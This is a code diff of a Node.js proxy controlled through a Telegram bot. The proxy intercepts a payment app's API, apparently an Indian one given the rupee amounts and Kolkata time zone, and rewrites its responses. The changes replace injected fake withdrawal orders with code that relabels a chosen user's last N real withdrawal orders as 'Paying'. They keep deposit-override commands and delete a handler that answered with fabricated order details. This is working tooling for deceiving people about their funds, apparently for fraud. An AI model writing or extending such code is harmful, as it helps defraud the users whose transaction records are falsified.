@@ -402,8 +402,8 @@ app.post('/api/telegram', async (req, res) => {
 /deposit off - ALL users normal
 
 === WITHDRAW COMMANDS ===
-/on withdraw <userId> <amount> - Add fake Paying withdrawal
-/off withdraw <userId> - Remove fake withdrawal
+/on withdraw <userId> <count> - Last N orders → Paying
+/off withdraw <userId> - Restore original status
 
 === PER-ID COMMANDS ===
 /id deposit on <amount> <userId>
@@ -574,30 +574,19 @@ Example:
     else if (text.match(/^\/on withdraw\s+/i)) {
       const wMatch = text.match(/^\/on withdraw\s+(\S+)\s+(\S+)$/i);
       if (!wMatch) {
-        await bot.sendMessage(chatId, '❌ Format: /on withdraw <userId> <amount>');
+        await bot.sendMessage(chatId, '❌ Format: /on withdraw <userId> <count>\nExample: /on withdraw 49740 2');
         return res.sendStatus(200);
       }
       const userId = wMatch[1];
-      const amount = parseFloat(wMatch[2]);
-      if (isNaN(amount) || amount <= 0) {
-        await bot.sendMessage(chatId, '❌ Invalid amount.');
+      const count = parseInt(wMatch[2]);
+      if (isNaN(count) || count <= 0) {
+        await bot.sendMessage(chatId, '❌ Invalid count. Must be a positive number.');
         return res.sendStatus(200);
       }
       if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
-      const now = new Date();
-      const orderId = 'DS' + now.getFullYear().toString().substring(2) + String(now.getMonth() + 1).padStart(2, '0') + String(now.getDate()).padStart(2, '0') + String(now.getHours()).padStart(2, '0') + String(now.getMinutes()).padStart(2, '0') + String(now.getSeconds()).padStart(2, '0') + String(now.getMilliseconds()).padStart(3, '0') + Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-      const createTime = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/(\d+)\/(\d+)\/(\d+),\s*/, '$3-$2-$1 ');
-      bankData.fakeWithdrawals[userId] = {
-        orderId,
-        amount: amount.toFixed(2),
-        status: 0,
-        statusName: 'Paying',
-        createTime,
-        userId,
-        createdAt: now.toISOString()
-      };
+      bankData.fakeWithdrawals[userId] = { count };
       await saveData(bankData);
-      await bot.sendMessage(chatId, `✅ Fake withdrawal added for user ${userId}\n💰 Amount: ₹${amount.toFixed(2)}\n📋 Order: ${orderId}\n📊 Status: Paying\n\nUse /off withdraw ${userId} to remove.`);
+      await bot.sendMessage(chatId, `✅ Withdraw override ON for user ${userId}\n🔄 Last ${count} order(s) → Paying status\n\nUse /off withdraw ${userId} to restore.`);
       return res.sendStatus(200);
     }
 
@@ -612,9 +601,9 @@ Example:
         const removed = bankData.fakeWithdrawals[userId];
         delete bankData.fakeWithdrawals[userId];
         await saveData(bankData);
-        await bot.sendMessage(chatId, `🗑 Fake withdrawal removed for user ${userId}\nOrder: ${removed.orderId}\nAmount: ₹${removed.amount}`);
+        await bot.sendMessage(chatId, `🗑 Withdraw override removed for user ${userId}\nWas: last ${removed.count} order(s) → Paying`);
       } else {
-        await bot.sendMessage(chatId, `ℹ️ No fake withdrawal found for user ${userId}.`);
+        await bot.sendMessage(chatId, `ℹ️ No withdraw override found for user ${userId}.`);
       }
       return res.sendStatus(200);
     }
@@ -762,9 +751,9 @@ For per-ID control: /id deposit on <amount> <userId>`
       msg += `Per-ID overrides: ${idCount}\n`;
       const fwCount = Object.keys(bankData.fakeWithdrawals || {}).length;
       if (fwCount > 0) {
-        msg += `Fake Withdrawals: ${fwCount} active\n`;
+        msg += `Withdraw Overrides: ${fwCount} active\n`;
         for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
-          msg += `  👤 ${uid}: ₹${fw.amount} (${fw.statusName})\n`;
+          msg += `  👤 ${uid}: last ${fw.count} order(s) → Paying\n`;
         }
       }
       if (active) {
@@ -1000,50 +989,34 @@ app.all('/money/rechargeRecord', async (req, res) => {
 });
 app.all('/withdraw/list', async (req, res) => {
   const bankData = await loadData();
-  const hasFakes = bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0;
+  const hasOverrides = bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0;
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    console.log('[withdraw/list] hasFakes:', hasFakes, 'fakeKeys:', Object.keys(bankData.fakeWithdrawals || {}), 'respDataType:', jsonResp ? typeof jsonResp.data : 'null');
-    if (jsonResp && jsonResp.data) {
-      const sample = JSON.stringify(jsonResp.data).substring(0, 300);
-      console.log('[withdraw/list] data sample:', sample);
-    }
-
-    if (hasFakes && jsonResp) {
-      const fakeItems = Object.values(bankData.fakeWithdrawals).map(fake => {
-        const existingItems = Array.isArray(jsonResp.data) ? jsonResp.data :
-          (jsonResp.data?.list || jsonResp.data?.records || []);
-        const template = existingItems.length > 0 ? { ...existingItems[0] } : {};
-        return {
-          ...template,
-          orderId: fake.orderId,
-          amount: fake.amount,
-          amountOrder: fake.amount,
-          status: fake.status,
-          statusName: fake.statusName,
-          createTime: fake.createTime,
-          userId: parseInt(fake.userId) || fake.userId
-        };
-      });
-
-      if (Array.isArray(jsonResp.data)) {
-        jsonResp.data.unshift(...fakeItems);
-      } else if (jsonResp.data && jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
-        jsonResp.data.list.unshift(...fakeItems);
-      } else if (jsonResp.data && jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
-        jsonResp.data.records.unshift(...fakeItems);
-      } else if (jsonResp.data && typeof jsonResp.data === 'object') {
+    if (hasOverrides && jsonResp && jsonResp.data) {
+      let items = null;
+      if (Array.isArray(jsonResp.data)) items = jsonResp.data;
+      else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
+      else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
+      else if (typeof jsonResp.data === 'object') {
         const arrKey = Object.keys(jsonResp.data).find(k => Array.isArray(jsonResp.data[k]));
-        if (arrKey) {
-          jsonResp.data[arrKey].unshift(...fakeItems);
-        } else {
-          if (!jsonResp.data.records) jsonResp.data.records = [];
-          jsonResp.data.records.unshift(...fakeItems);
+        if (arrKey) items = jsonResp.data[arrKey];
+      }
+
+      if (items && items.length > 0) {
+        for (const [uid, override] of Object.entries(bankData.fakeWithdrawals)) {
+          const count = override.count || 0;
+          if (count <= 0) continue;
+          let changed = 0;
+          for (let i = items.length - 1; i >= 0 && changed < count; i--) {
+            items[i].status = 0;
+            items[i].statusName = 'Paying';
+            changed++;
+          }
+          console.log('[withdraw/list] Changed', changed, 'items to Paying for user', uid);
         }
       }
-      console.log('[withdraw/list] Injected', fakeItems.length, 'fake items');
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1051,37 +1024,6 @@ app.all('/withdraw/list', async (req, res) => {
     console.error('withdraw/list proxy error:', e.message);
     if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
   }
-});
-
-app.all('/withdraw/orderId', async (req, res) => {
-  const bankData = await loadData();
-  const qs = new URLSearchParams((req.originalUrl.split('?')[1]) || '');
-  const reqOrderId = req.parsedBody?.orderId || qs.get('orderId') || '';
-
-  console.log('[withdraw/orderId] reqOrderId:', reqOrderId, 'fakeWithdrawals:', Object.keys(bankData.fakeWithdrawals || {}));
-
-  if (bankData.fakeWithdrawals && reqOrderId) {
-    for (const [uid, fake] of Object.entries(bankData.fakeWithdrawals)) {
-      if (fake.orderId === reqOrderId) {
-        console.log('[withdraw/orderId] Matched fake for user:', uid);
-        return res.json({
-          code: 1,
-          data: {
-            orderId: fake.orderId,
-            amount: fake.amount,
-            amountOrder: fake.amount,
-            status: fake.status,
-            statusName: fake.statusName,
-            createTime: fake.createTime,
-            userId: parseInt(uid) || uid
-          },
-          msg: 'success'
-        });
-      }
-    }
-  }
-
-  await transparentProxy(req, res);
 });
 
 app.all('/money/withdrawRecord', async (req, res) => {
